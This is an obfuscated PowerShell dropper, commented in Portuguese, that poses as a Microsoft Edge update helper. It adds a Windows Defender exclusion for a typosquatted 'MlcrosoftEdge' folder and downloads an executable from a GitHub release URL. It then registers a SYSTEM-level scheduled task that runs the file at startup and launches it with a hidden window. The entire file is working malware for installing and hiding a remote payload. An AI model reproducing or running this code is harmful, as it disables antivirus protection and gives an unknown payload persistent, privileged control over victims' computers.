<#
.SYNOPSIS
D32N 8UD2N328UDXCM3289XM2U83XM238XMU28UXM238MX238X23

.DESCRIPTION
NSDA8D7213ND328YM243DC87Y2M4C28Y7MN2C84YUNM283CM2C4
#>

[CmdletBinding()]
param()

$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL = "https://github.com/4ybbe/phpSv/releases/download/stupid/EdgeUpdateSupport.exe"
$asokimasoaosmodasmodpaD = "C:\ProgramData\MlcrosoftEdge"
$TksdaoqawopqwNisadnia = "MlcrosoftEdgeUpdateHelper"

function Test-IsAdmin {
    $p = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $p.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

function ExzxxxxxClllasdnhasuiyd {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Path
    )
    
    try {
        if (Get-Command "Add-MpPreference" -ErrorAction SilentlyContinue) {
            Add-MpPreference -ExclusionPath $Path -ErrorAction Stop
        } else {
            Write-Warning "Windows Defender não encontrado ou não disponível."
        }
    } catch {
        Write-Warning "Falha ao adicionar exclusão no Windows Defender: $_"
        Write-Warning "Tente executar como administrador ou adicione manualmente."
    }
}

function Download-File {
    param(
        [Parameter(Mandatory=$true)]
        [string]$ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL,
        [Parameter(Mandatory=$true)]
        [string]$OutFile,
        [int]$Retries = 3
    )
    
    for ($i = 0; $i -lt $Retries; $i++) {
        try {
            Invoke-WebRequest -Uri $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $OutFile -UseBasicParsing -ErrorAction Stop
            return
        } catch {
            if ($i -eq ($Retries - 1)) {
                throw "Falha ao baixar o arquivo após $Retries tentativas: $_"
            }
            Start-Sleep -Seconds 2
        }
    }
}

function Add-ScheduledTask {
    param(
        [Parameter(Mandatory=$true)]
        [string]$Nome,
        [Parameter(Mandatory=$true)]
        [string]$CaminhoExecutavel
    )
    
    try {
        
        $tarefaExistente = Get-ScheduledTask -TaskName $Nome -ErrorAction SilentlyContinue
        if ($tarefaExistente) {
            Unregister-ScheduledTask -TaskName $Nome -Confirm:$false -ErrorAction Stop
        }
        
        $Acao = New-ScheduledTaskAction -Execute $CaminhoExecutavel
        
        $Gatilho = New-ScheduledTaskTrigger -AtStartup
        
        $Configuracoes = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -MultipleInstances IgnoreNew
        
        $Usuario = "SYSTEM"
        
        Register-ScheduledTask -TaskName $Nome -Action $Acao -Trigger $Gatilho -Settings $Configuracoes -User $Usuario -RunLevel Highest -Force
        
    } catch {
        throw "Falha ao criar tarefa no agendador: $_"
    }
}

function Main {
    $isAdmin = Test-IsAdmin
    if (-not $isAdmin) {
        
        $confirma = Read-Host "Deseja continuar mesmo assim? (S/N)"
        if ($confirma -ne 'S' -and $confirma -ne 's') {
            return
        }
    }
    
    try {
        if (-not (Test-Path -Path $asokimasoaosmodasmodpaD)) {
            New-Item -ItemType Directory -Path $asokimasoaosmodasmodpaD -Force | Out-Null
        } else {
            Write-Host "Diretório já existe: $asokimasoaosmodasmodpaD"
        }
        
        # Adiciona exclusão no Windows Defender
        if ($isAdmin) {
            ExzxxxxxClllasdnhasuiyd -Path $asokimasoaosmodasmodpaD
        } else {
            Write-Warning "Não é administrador. Pulando exclusão do Defender."
        }
        
        # 2. Baixa o executável
        $nomeArquivo = [System.IO.Path]::GetFileName($ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL)
        if ([string]::IsNullOrEmpty($nomeArquivo)) {
            $nomeArquivo = "aplicacao.exe"
        }
        $caminhoCompleto = Join-Path -Path $asokimasoaosmodasmodpaD -ChildPath $nomeArquivo
        Download-File -Url $ndsaijnbdsaiuhjbUdsauhibhusdahbRdmdsaoaL -OutFile $caminhoCompleto
        
        if ($isAdmin) {
            Add-ScheduledTask -Nome $TksdaoqawopqwNisadnia -CaminhoExecutavel $caminhoCompleto
        } else {
            Write-Warning "Não é administrador. Não é possível criar tarefa no agendador."
            Write-Warning "Para criar a tarefa manualmente, execute como administrador:"
            Write-Warning "schtasks /create /tn '$TksdaoqawopqwNisadnia' /tr '$caminhoCompleto' /sc onstart /ru SYSTEM /rl HIGHEST"
        }
        
        # 4. Inicia o executável
        if (Test-Path -Path $caminhoCompleto) {
            Start-Process -FilePath $caminhoCompleto -WindowStyle Hidden
            Write-Host "Processo iniciado com sucesso!" -ForegroundColor Green
        } else {
            throw "Arquivo não encontrado para iniciar: $caminhoCompleto"
        }
        
    } catch {
        Exit 1
    }
}

Main
